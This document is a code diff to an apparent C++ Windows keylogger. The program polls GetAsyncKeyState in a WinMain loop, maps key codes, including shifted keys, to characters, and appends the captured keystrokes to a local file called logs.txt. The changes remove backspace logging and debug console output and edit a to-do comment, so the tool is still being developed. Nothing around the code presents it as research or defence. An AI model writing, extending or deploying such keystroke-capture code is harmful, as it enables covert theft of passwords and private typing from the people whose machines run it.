@@ -14,12 +14,7 @@ void writeKeyStroke(int trueKey)
     std::ofstream file;
     file.open("logs.txt", std::ios::app);
         
-    if (trueKey == BACKSPACE)
-        
-    {
-        file << "BACKSPACE";
-    }
-    else if (trueKey == ENTER)
+    if (trueKey == ENTER)
     {
         file << "\n";
     }
@@ -43,7 +38,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             int key = GetAsyncKeyState(i);
             while (key == KEY_IS_PRESSED && i != 16)
             {
-                std::cout << i << '\n';
                 int specialKey = vkMaps.searchAsciiMaps(i);
                 if (isShiftPressed() == 1) 
                 {
@@ -52,7 +46,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 }
                 else if (vkMaps.searchMiscMaps(i) != 1) 
                 {
-                    std::cout << "truee";
                     key = 0;
                 }
                 else if (vkMaps.searchAsciiMaps(i) != 1) 
@@ -76,7 +69,5 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         
 
             To-do
-        ~ develop naming convention for characters that don't translate to ascii values. 
-        {kp=BACKSPACE}
 
 */ 
